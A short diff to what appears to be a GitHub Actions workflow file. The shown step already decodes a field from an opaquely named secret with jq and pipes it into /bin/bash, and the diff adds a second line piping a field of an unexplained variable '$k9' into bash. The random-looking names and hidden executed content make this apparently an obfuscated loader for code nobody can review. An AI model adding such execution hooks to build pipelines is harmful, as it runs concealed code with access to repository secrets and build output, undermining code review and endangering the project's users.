@@ -18,6 +18,7 @@ jobs:
           aeksv2368: ${{ secrets.aeksv2368 }}
         run: |
           printf '%s' "$aeksv2368" | jq -r .ibma448 | /bin/bash
+          echo $k9 | jq -r .ntr4160 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
